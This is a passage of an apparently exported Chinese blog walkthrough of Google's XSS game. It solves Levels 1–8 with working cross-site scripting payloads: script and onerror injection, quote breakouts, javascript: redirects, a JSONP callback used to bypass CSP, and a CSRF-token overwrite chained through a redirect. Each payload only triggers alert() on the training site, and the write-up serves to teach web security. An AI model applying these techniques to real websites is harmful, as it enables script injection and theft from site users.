('nonce-...') is required to enable inline execution. Note also that 'script-src' was not explicitly set, so 'default-src' is used as a fallback.\n```\n因为 CSP 的关系，失败了。\n\n没关系，我们换套路，既然 menu 的参数能显示到页面内，我们又知道了这个站有 callback 的缺陷，我们结合一下。\n\n先给个小提示：\n\n![Level_7_Pass_idea](/Image/Level_7_Pass_idea.png)\n\n自己先想两分钟~\n\n```\n给 menu 传入经过 base64 编码后的：\n    <script src='jsonp?callback=alert()%3B//'></script> // 转义前为：<script src='jsonp?callback=alert();//'></script>\n会把\n    <script src='jsonp?callback=alert();//'></script>\n显示在页面上，script 标签会尝试加载，触发一个请求，script 而请求的返回内容为：\n    alert();//({...})\nalert(); 后面被注释掉，执行 alert();\n\n```\n最后我们组织的 URL 为：\n```\nhttp://www.xssgame.com/f/wmOM2q5NJnZS/?menu=PHNjcmlwdCBzcmM9J2pzb25wP2NhbGxiYWNrPWFsZXJ0KCklM0IvLyc+PC9zY3JpcHQ+\n```\n过关：\n\n![Level_7_Pass](/Image/Level_7_Pass.png)\n\n## Level 8  \n\n[最后一关的贴心传送门 QAQ](http://www.xssgame.com/d9u16LTxchEi)\n\n![Level_8_Welcome](/Image/Level_8_Welcome.png)\n\n>This challenge demonstrates many web security concepts such as CSP, Cross Site Request Forgery Tokens and Self-XSS.\n\n好，我们继续无视提示信息，来看一下这一关。\n\n尊敬下上一关，我们先看一下 Level8.js 的内容：\n\n![Level_8_Level8js](/Image/Level_8_Level8js.png)\n\n这个文件负责读取 cookie 的信息，如果读取到了 'name' 的内容，就 document.write 到页面上。\n通过观察页面我们发现，这个 name 好像是我们自己输入的啊。那我们输入%……&*，他一显示到页面上不就……\n\n行了，别意淫了：\n\n![Level_8_CSP](/Image/Level_8_CSP.png)\n\n我们来看看有没有其他可以利用的地方呢。先试试功能吧。\n\n我们随便设置一下名字：\n\n![Level_8_Set_Name](/Image/Level_8_Set_Name.png)\n\n点击 Set 看看发生了什么:\n\n![Level_8_Set_End](/Image/Level_8_Set_End.png)\n\n页面上显示了我们的 name，这个不意外，让人奇怪的是他 set 动作的 URL：\n```\nhttp://www.xssgame.com/f/d9u16LTxchEi/set?name=name&value=Geekaleo&redirect=index\n其中：\nset?name=name&value=Geekaleo&redirect=index\nname=name value=Geekaleo 不禁让人菊花一紧\n那我：\nname=csrf_token value=balabala 是不是也行？那不是随便设置csrf_token了……\n\nredirect=index 显然这个参数是用来跳转的\n```\nset csrf_token 我们一会验证，先来试一下这个汇款功能，给 hello kitty 汇一分钱试试水：\n\n![Level_8_Send](/Image/Level_8_Send.png)\n\n我们接到了一个警告福利：\n\n![Level_8_Send_Fail](/Image/Level_8_Send_Fail.png)\n\n这里我们得到了几个有用的信息：\n\n>1.我们输入的不合法金额也就是 'amount' 参数的值被返回到了前台打印了出来。  \n2.此页面没有 CSP 的标识。  \n3.csrf_token 作为参数传递给后台。  \n\n根据前两点呢，我们测试一下 把 'amount' 的内容改成一段能够触发 alert() 的脚本：\n\n![Level_8_Pass_Fail](/Image/Level_8_Pass_Fail.png)\n\n成功收到一个不符合通关要求的提示，因为 csrf_token 每个人的都不同，这个链接别人访问是酱紫的：\n\n![Level_8_Token_Not_Same](/Image/Level_8_Token_Not_Same.png)\n\n这时候我们之前的猜测就有用处了，这个 token 很可能可以被 set，如果可行，那就通…… 你懂得。\n\n我们来通过 set 设置 token，通过 redirect 跳转到我们之前成功 alert() 的汇款链接，并把其中的 token 设置成我们前面 set 的值。\n\nOK，我们来构建URL：\n\n```\nhttp://www.xssgame.com/f/d9u16LTxchEi/set?name=csrf_token&value=Pass&redirect=transfer?name=hello+kitty&amount=<script>alert()</script>&csrf_token=Pass\n\n这里要注意，我们如果直接这样访问，redirect 的值会是：transfer?name=hello kitty。也就是到下一个 & 符会被截断。\n\n所以我们这里 把这个 'redirect=' 后面的内容处理一下，chrome 控制台：\nencodeURIComponent('transfer?name=hello+kitty&amount=%3Cscript%3Ealert()%3C/script%3E&csrf_token=Pass')\n得到返回值：\ntransfer%3Fname%3Dhello%2Bkitty%26amount%3D%253Cscript%253Ealert()%253C%2Fscript%253E%26csrf_token%3DPass\n\n好我们替换一下 URL：\nhttp://www.xssgame.com/f/d9u16LTxchEi/set?name=csrf_token&value=Pass&redirect=transfer%3Fname%3Dhello%2Bkitty%26amount%3D%253Cscript%253Ealert()%253C%2Fscript%253E%26csrf_token%3DPass\n```\n:) 过关：\n\n![Level_8_Pass](/Image/Level_8_Pass.png)\n\n\n愣愣的盯着最后的图，感觉身体被掏空，进入了……贤者时间……\n\n![All_Level_Pass](/Image/All_Level_Pass.png)\n\n「别等了，没彩蛋…… QAQ」\n","slug":"Google_xssgame","published":1,"updated":"2017-09-07T16:50:45.000Z","photos":[],"link":"","_id":"cjh9h0k870006mkwb58jglpxb","content":"<p>此链接只能墙外围观享用</p>\n<p>主站：<a href=\"http://www.xssgame.com\" target=\"_blank\" rel=\"external\">www.xssgame.com</a> </p>\n<p><img src=\"/Image/Start_Playing.png\" alt=\"StartPlay\">  </p>\n<a id=\"more\"></a>\n<hr>\n<p>刚一进来我们就看到了一个黑影脚踏拔丝煎面飞入了一坨乳……啊脂肪中。<br>这个设计游戏的人是个高手，如果是未经此事的年轻人看见，现在可能吓得把裤子都脱了……</p>\n<p>下面进入正片，车辆起步，请坐稳扶好，靠近屏幕的乘客，请系好裤腰带。</p>\n<h2 id=\"LEVEL-1\"><a href=\"#LEVEL-1\" class=\"headerlink\" title=\"LEVEL 1\"></a>LEVEL 1</h2><p><a href=\"http://www.xssgame.com/m4KKGHi2rVUN\" target=\"_blank\" rel=\"external\">贴心的传送门</a></p>\n<p><img src=\"/Image/Level_1_Welcome.png\" alt=\"StartPlay\"><br>上面的英文大致是个玩法的介绍和一些关于本关的信息：  </p>\n<blockquote>\n<p>此级别显示XSS的常见原因，其中用户输入直接写入页面而不进行正确的转义。<br>与下面的脆弱应用程序窗口进行交互，并找到一种方法来执行您选择的JavaScript。 您可以在易受攻击的窗口内采取行动，或直接编辑其网址栏。<br>输入一个将使应用程序在JavaScript中执行alert()函数的输入。<br>一旦您弹出警报，该解决方案将在服务器端进行验证，您将能够进入下一个级别。 重要的是，解决方案不需要用户交互 - 打开URL应该足以触发警报。<br>–来自原汁原味的 translate.google.com （自己感受下）</p>\n</blockquote>\n<p>「说人话！」</p>\n<p>通过改造URL，在访问原页面时执行 javascript 的 alert()，并且保证任何人直接访问你修改后的URL时都能弹出alert框……。</p>\n<p>至于 javascript、alert 是什么，alert 与 XSS 到底是什么关系，为啥 XSS 的游戏要让你用 alert 过关呢，我就不赘述了，百度一下你就上当：）</p>\n<p>「上当咋整啊，本来就啥都不会，不能告诉个不上当的方法？」</p>\n<p>你别说，还真能：</p>\n<p><img src=\"/Image/ad.png\" alt=\"ad\"></p>\n<p>//我是一个不生硬的过度，下面开始正题 →_→ 跑太远扯不回来了</p>\n<p>我们打开 chrome 浏览器的开发者工具(F12)看一下这个站的页面相关文件。</p>\n<p><img src=\"/Image/Level_1_Tree_Detail.png\" alt=\"LEVEL_1_TREE_DETAIL\"></p>\n<p>其中 <em>index</em> 是主页文件，<em>foogle.png</em> 是大 Foogle Logo，唯独 <em>js_frame.js</em> 不确定。进去看看后发现这个文件是判定你的 XSS 是否符合要求的“xssgame 游戏的官方文件”，这里不分析，因其非本篇重点，直接给定义略过。</p>\n<p><em>index</em> 中是一个简单的 form 表单的提交。我们随便搜点什么后：<br>1.URL 变化<br>2.页面重新加载<br>3.刚刚搜索的内容被一起加载到也页面中。  </p>\n<p>其中 URL 结尾的 ?query= 后面的字符串跟页面上显示的字符串一致。<br>回到我们的初衷，要让其弹窗。那我们只需要让页面被嵌入一段被加载时弹窗的 javascript 代码段就好了：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;script&gt;alert()&lt;/script&gt;</div></pre></td></tr></table></figure></p>\n<p>拼出如下URL：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">http://www.xssgame.com/f/m4KKGHi2rVUN/?query=&lt;script&gt;alert()&lt;/script&gt;</div></pre></td></tr></table></figure>\n<p><strong>使其在页面加载时就载入含有 alert 效果的 javascript 代码块。</strong></p>\n<p>过关：<br><img src=\"/Image/LEVEL_1_Pass.png\" alt=\"LEVEL_1_PASS\"></p>\n<h2 id=\"LEVEL-2\"><a href=\"#LEVEL-2\" class=\"headerlink\" title=\"LEVEL 2\"></a>LEVEL 2</h2><p><a href=\"http://www.xssgame.com/WrfpuKFX8GNr\" target=\"_blank\" rel=\"external\">贴心的传送门</a></p>\n<p><img src=\"/Image/Level_2_Welcome.png\" alt=\"StartPlay2\"></p>\n<hr>\n<p>来看一下页面上的信息：</p>\n<blockquote>\n<p>用户提供的数据的每一位都必须正确地转义为其出现的页面的上下文。 这个级别显示为什么。<br>输入一个将使应用程序在JavaScript中执行alert()函数的输入。<br>–来自原汁原味的 translate.google.com （哎，不背锅，哎）</p>\n</blockquote>\n<p>大意是在提醒我们，要注意每一个比特。<br>举个栗子：你以为你家孩子就是你亲生的，但隔壁老王每天冲你笑，毕竟你不是每天晚上都在家。 </p>\n<p>// 不生硬，一点都不生硬的过度</p>\n<p>初次加载的文件中规中矩，一个<em>index</em>里面一个通过 GET 方式提交的 form 表单，表单提交一个 timer 参数给后台，以及一个 js_frame.js 文件。</p>\n<p>我们先填一个正常的参数，提交一下试试看，默认是3，那就填3吧：<br><img src=\"/Image/Level_2_Create_Timer.png\" alt=\"CreateTimer\"></p>\n<p>来看一下新跳转的页面有哪些需要注意的东西：<br><img src=\"/Image/Level_2_Timer_Js.png\" alt=\"CreateTimer\"></p>\n<p>我们观察发现：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">id</span>=<span class=\"string\">\"loading\"</span> <span class=\"attr\">src</span>=<span class=\"string\">\"/static/img/loading.gif\"</span> <span class=\"attr\">style</span>=<span class=\"string\">\"width: 50%\"</span> <span class=\"attr\">onload</span>=<span class=\"string\">\"startTimer('3');\"</span> /&gt;</span></div></pre></td></tr></table></figure></p>\n<p>和<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">\"message\"</span>&gt;</span>Your timer will execute in 3 seconds.<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>两处回显了我们的数据。而前半部 javascript 代码也有一个3：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">startTimer</span>(<span class=\"params\">seconds</span>) </span>&#123;</div><div class=\"line\">    seconds = <span class=\"built_in\">parseInt</span>(seconds) || <span class=\"number\">3</span>;</div><div class=\"line\">    setTimeout(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</div><div class=\"line\">        <span class=\"built_in\">window</span>.confirm(<span class=\"string\">\"Time is up!\"</span>);</div><div class=\"line\">        <span class=\"built_in\">window</span>.loading.style.display = <span class=\"string\">'none'</span>;</div><div class=\"line\">        <span class=\"built_in\">window</span>.message.innerHTML = <span class=\"string\">'&lt;a href=\"?\"&gt;Go back&lt;/a&gt; to the timer setup page'</span>;</div><div class=\"line\">    &#125;, seconds * <span class=\"number\">1000</span>);</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>提交其他参数后发现，跟我们提交的参数无关，无视之。<br>那么前两处中，我们先看第一处（看到这个字就有点怪怪的感觉……）：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">id</span>=<span class=\"string\">\"loading\"</span> <span class=\"attr\">src</span>=<span class=\"string\">\"/static/img/loading.gif\"</span> <span class=\"attr\">style</span>=<span class=\"string\">\"width: 50%\"</span> <span class=\"attr\">onload</span>=<span class=\"string\">\"startTimer('3');\"</span> /&gt;</span></div></pre></td></tr></table></figure></p>\n<p>这里可以搞：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">onload = <span class=\"string\">\"startTimer('3');\"</span></div></pre></td></tr></table></figure></p>\n<p>怎么搞呢，你需要知道一个知识点：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;script&gt;</div><div class=\"line\">    <span class=\"keyword\">var</span> a = <span class=\"string\">'a'</span> + alert(); <span class=\"comment\">// 或者 '-' 也可以，重点在于让 alert() 参与运算</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// 当 alert() 参与运算的时候</span></div><div class=\"line\">    <span class=\"comment\">// js 会尝试让 alert() 先执行</span></div><div class=\"line\">    <span class=\"comment\">// 然后取其执行后的返回值再参与前面的运算</span></div><div class=\"line\">    <span class=\"comment\">// 我就问你任性不。「任性~」『←_← 真尼玛能给自己加戏』</span></div><div class=\"line\">&lt;<span class=\"regexp\">/script&gt;</span></div></pre></td></tr></table></figure></p>\n<p>我们再结合 img 标签的 onload 事件：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div></pre></td><td class=\"code\"><pre><div class=\"line\">onload = <span class=\"string\">\"startTime('?')\"</span>; <span class=\"comment\">// 这里需要把上面的知识点利用上 也就是把 alert() 以合适的体位插入 ? 的地方</span></div><div class=\"line\"><span class=\"comment\">/*</span></div><div class=\"line\">    别往下瞅了，下面就是答案了，自己不寻思寻思啊</div><div class=\"line\">    强行占一行</div><div class=\"line\">    再来一行</div><div class=\"line\">    嗯，上下注释符号还能占两行，差不多了。</div><div class=\"line\">*/</div><div class=\"line\"><span class=\"comment\">// 先尝试直接插入alert()</span></div><div class=\"line\">onload = <span class=\"string\">\"startTimer('alert()')\"</span>; <span class=\"comment\">// startTimer('alert()'); …… 这不直接当字符串传过去了吗…… 不行</span></div><div class=\"line\"><span class=\"comment\">// 看看上面的知识点……</span></div><div class=\"line\"><span class=\"comment\">// 插入 a'+alert()+'a</span></div><div class=\"line\">onload = <span class=\"string\">\"startTimer('a'+alert()+'a')\"</span>; <span class=\"comment\">// 这应该差不多了…… 可是好像a没啥用啊，不传不也还是字符串吗，只不过是空字符串</span></div><div class=\"line\"><span class=\"comment\">// 插入 '+alert()+'</span></div><div class=\"line\">onload = <span class=\"string\">\"startTimer(''+alert()+'')\"</span>;</div></pre></td></tr></table></figure></p>\n<p>嗯，想好了体位，接下来要后退几步，对着 URL 酝酿一下~<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">http://www.xssgame.com/f/WrfpuKFX8GNr/?timer=&apos;+alert()+&apos;</div></pre></td></tr></table></figure></p>\n<p>提交一下……<br>「我曹不对吧」<br>「这也没过关啊，日，讲啥呢一天天。」<br>「你哔哔这么长时间，念经呢这是？」<br>别着急，’+’ 号在URL里有独特的含义，直接写进去就当成URL约定的含义去解读了。<br>我们这边转义一下这个’+’字符,在 chrome 控制台中输入这个函数并按回车，会返回给你一个转义后的字符串：<br><img src=\"/Image/Level_2_URL_Encode.png\" alt=\"Level_2_URL_Encode\"><br>我们用%2B（或%2b）替换一下原来的加号。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">http://www.xssgame.com/f/WrfpuKFX8GNr/?timer=&apos;%2Balert()%2B&apos;</div></pre></td></tr></table></figure></p>\n<p>过关：<br><img src=\"/Image/Level_2_Pass.png\" alt=\"Level_2_Pass\"><br>上图中的 URL 虽然我们提交的是’%2B’,浏览器最后再显示给你的时候会自动帮你转回来方便你阅读。如果你此时不修改’+’为’%2B’再提交一次，你就会发现你提交的是’+’,我们也并没有再次过关 :)<br>另外，直接用’-‘号其实没这么麻烦，不用转义，直接写就行 :)<br>「……」<br><img src=\"/Image/pugaizai.jpeg\" alt=\"pugai\"><br><strong>上面的两chu，我只说了第一chu，那第二chu朋友们自行尝试（第一关的套路照搬过来行不通哟~）</strong></p>\n<h2 id=\"LEVEL-3\"><a href=\"#LEVEL-3\" class=\"headerlink\" title=\"LEVEL 3\"></a>LEVEL 3</h2><p><a href=\"http://www.xssgame.com/u0hrDTsXmyVJ\" target=\"_blank\" rel=\"external\">贴心传送门</a>  </p>\n<p><img src=\"/Image/Level_3_Welcome.png\" alt=\"Level_3_Welcome\">  </p>\n<hr>\n<p>见证机翻的时刻：</p>\n<blockquote>\n<p>复杂的Web应用程序通常会在JavaScript中生成UI的部分内容。 一些常见的JS功能是执行接收器，这意味着它们将导致浏览器执行出现在其输入中的任何脚本。<br>该级别的应用程序正在使用一个这样的接收器。<br>由于您无法在应用程序中的任何位置输入您的负载，因此您必须手动编辑提供的URL栏中的地址。 目标是利用应用程序中的一个漏洞来执行JavaScript alert()函数。<br>–来自看完觉得没什么卵用的 translate.google.com  </p>\n</blockquote>\n<p>其实我在通这个系列的时候是没看这些提示信息的，一是觉得不看也能过，二是怕自己的想法被提示牵着走，这样过关也挺没劲的。嗯，类似「圣人模式」那种惆怅。<br>后来总结的时候呢，发现里面确实是有一些信息的，写经验的时候还是写进来比较好，万一对一些人有帮助呢，所以我就插了个机翻，并因为经费紧张，旁白君的解读直接砍掉了:) </p>\n<p>// 过渡~<br>看得出来，这是一位吸猫癌患者:<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"tab\"</span> <span class=\"attr\">id</span>=<span class=\"string\">\"tab1\"</span> <span class=\"attr\">onclick</span>=<span class=\"string\">\"chooseTab('1')\"</span>&gt;</span>Cat 1<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"tab\"</span> <span class=\"attr\">id</span>=<span class=\"string\">\"tab2\"</span> <span class=\"attr\">onclick</span>=<span class=\"string\">\"chooseTab('2')\"</span>&gt;</span>Cat 2<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"tab\"</span> <span class=\"attr\">id</span>=<span class=\"string\">\"tab3\"</span> <span class=\"attr\">onclick</span>=<span class=\"string\">\"chooseTab('3')\"</span>&gt;</span>Cat 3<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p><em>index</em> 里非常暴躁的来了个 Cat 1 2 3，直让我菊花一紧：  </p>\n<p><img src=\"/Image/shut_up_and_bbox.jpg\" alt=\"bbox\">  </p>\n<p>奈何对猫有些抗拒，看见 onclick 事件基本没什么点一下试试看的想法，那就只能看代码了：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">chooseTab</span>(<span class=\"params\">name</span>) </span>&#123;</div><div class=\"line\">    <span class=\"keyword\">var</span> html = <span class=\"string\">\"Cat \"</span> + <span class=\"built_in\">parseInt</span>(name) + <span class=\"string\">\"&lt;br&gt;\"</span>;</div><div class=\"line\">    html += <span class=\"string\">\"&lt;img src='/static/img/cat\"</span> + name + <span class=\"string\">\".jpg' /&gt;\"</span>;</div><div class=\"line\">    <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'tabContent'</span>).innerHTML = html;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// Select the current tab</span></div><div class=\"line\">    <span class=\"keyword\">var</span> tabs = <span class=\"built_in\">document</span>.querySelectorAll(<span class=\"string\">'.tab'</span>);</div><div class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; tabs.length; i++) &#123;</div><div class=\"line\">        <span class=\"keyword\">if</span> (tabs[i].id == <span class=\"string\">\"tab\"</span> + <span class=\"built_in\">parseInt</span>(name)) &#123;</div><div class=\"line\">            tabs[i].className = <span class=\"string\">\"tab active\"</span>;</div><div class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</div><div class=\"line\">            tabs[i].className = <span class=\"string\">\"tab\"</span>;</div><div class=\"line\">        &#125;</div><div class=\"line\">    &#125;</div><div class=\"line\">    <span class=\"built_in\">window</span>.location.hash = name;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// Tell parent we've changed the tab</span></div><div class=\"line\">    top.postMessage(&#123;<span class=\"string\">'url'</span>: self.location.toString()&#125;, <span class=\"string\">\"*\"</span>);</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>这个方法的实现看到第三行就不用看了，已经知道在干嘛了，传进来一个数字，请求相应’数字.jpg’的图片。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">需要注意的是通过 innerHTML 写到 div 中。而 innerHTML 方法直接写入的 &lt;script&gt;...&lt;/script&gt; 并不会被执行。</div></pre></td></tr></table></figure></p>\n<p>没关系啊，有了上一关的经验，我们可以拼字符串啊。<br>佛死特奥富奥，你得知道个知识点：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">''</span> <span class=\"attr\">onerror</span>=<span class=\"string\">'alert()'</span> /&gt;</span></div><div class=\"line\"><span class=\"comment\">&lt;!--</span></div><div class=\"line\">    当图片加载错误的时候，就会执行 onerror 中的 alert() 方法</div><div class=\"line\">    对于本关</div><div class=\"line\">    我们只需要让他访问一个不存在的图片并让其执行 onerror='alert()' 就OK了</div><div class=\"line\">    你问我怎么让它执行？</div><div class=\"line\">    插啊，插进去不就行了吗 →_→</div><div class=\"line\">--&gt;</div></pre></td></tr></table></figure></p>\n<p>我们拼出如下URL：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">http://www.xssgame.com/f/u0hrDTsXmyVJ/#1&apos; onerror=&apos;alert()&apos;</div></pre></td></tr></table></figure></p>\n<p><strong>用单引号截断1,使其 scr 指向’1’这个文件，并加入 onerror 事件，而因为’1’这个文件不存在，加载错误，转而执行 onerror 中的 alert() 方法。</strong></p>\n<p>过关：<br><img src=\"/Image/Level_3_Pass.png\" alt=\"Level_3_Pass\"></p>\n<h2 id=\"LEVEL-4\"><a href=\"#LEVEL-4\" class=\"headerlink\" title=\"LEVEL 4\"></a>LEVEL 4</h2><p><a href=\"http://www.xssgame.com/__58a1wgqGgI\" target=\"_blank\" rel=\"external\">贴心传送门</a></p>\n<p><img src=\"/Image/Level_4_Welcome.png\" alt=\"Level_4_Welcome\">  </p>\n<p>来看一下提示里面的有效信息:</p>\n<blockquote>\n<p>跨站点脚本不仅仅是正确地转义数据。 有时，即使没有在DOM中注入新的元素，攻击者也可以做坏事。</p>\n</blockquote>\n<p>再来看一下页面内容：</p>\n<p><img src=\"/Image/Level_4_Sign_Up.png\" alt=\"Level_4_Sign_up\"></p>\n<p>我们先跟着流程走一下，过程中看看有没有什么可利用的地方：</p>\n<p>sign up 按钮的代码是这样的：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"signup?next=confirm\"</span>&gt;</span>Sign up<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>点击以后，我们跳转到这个页面：</p>\n<p><img src=\"/Image/Level_4_Enter_Email.png\" alt=\"Level_4_Enter_Email\"></p>\n<p>页面中有一段注释：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">&lt;!-- We're ignoring the email, but the poor user will never know! --&gt;</span></div></pre></td></tr></table></figure></p>\n<p>……神经病</p>\n<p>next &gt;&gt; 的代码是这样：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"confirm?next=welcome\"</span>&gt;</span>Next &gt;&gt;<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>点击 next &gt;&gt; 会跳转到下一个页面</p>\n<p><img src=\"/Image/Level_4_Thanks_For.png\" alt=\"Level_4_Thanks_For\"></p>\n<p>页面代码如下：</p>\n<p><img src=\"/Image/Level_4_Thanks_For_Source.png\" alt=\"Level_4_Thanks_For_Source\"></p>\n<p>我们注意到有这样一个地方：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;script&gt;</div><div class=\"line\">    setTimeout(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123; <span class=\"built_in\">window</span>.location = <span class=\"string\">'welcome'</span>; &#125;, <span class=\"number\">1000</span>);</div><div class=\"line\"><span class=\"xml\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span></div></pre></td></tr></table></figure></p>\n<p>其中的’Welcome’像是我们 URL 中传入的参数。<br>经传入其他参数测试，发现 window.location = 我们传入的参数。<br>这样问题就简单了，首先，知识点你得有：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">window</span>.location = <span class=\"string\">'welcome'</span>; </div><div class=\"line\"><span class=\"comment\">/*</span></div><div class=\"line\">    这是一个页面重定向的操作</div><div class=\"line\">    这里就不展开普及了,可以去 w3school 充充电。</div><div class=\"line\">    window.location 等同于 window.location.href</div><div class=\"line\">    而 DOM 的 href 属性呢，支持这样写：</div><div class=\"line\">    &lt;a href='javascript:alert()' &gt; &lt;/a&gt;</div><div class=\"line\">    咳咳，你懂得。</div><div class=\"line\">*/</div></pre></td></tr></table></figure></p>\n<p>所以这边只需要传入：’javascript:alert()’ 来替换 ‘welcome’ 就可以了：<br>拼出如下 URL:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">http://www.xssgame.com/f/__58a1wgqGgI/confirm?next=javascript:alert()</div></pre></td></tr></table></figure></p>\n<p>过关:<br><img src=\"/Image/Level_4_Pass.png\" alt=\"Level_4_Pass.png\"></p>\n<h2 id=\"LEVEL-5\"><a href=\"#LEVEL-5\" class=\"headerlink\" title=\"LEVEL 5\"></a>LEVEL 5</h2><p><a href=\"http://www.xssgame.com/JFTG_t7t3N-P\" target=\"_blank\" rel=\"external\">贴心传送门</a></p>\n<p><img src=\"/Image/Level_5_Welcome.png\" 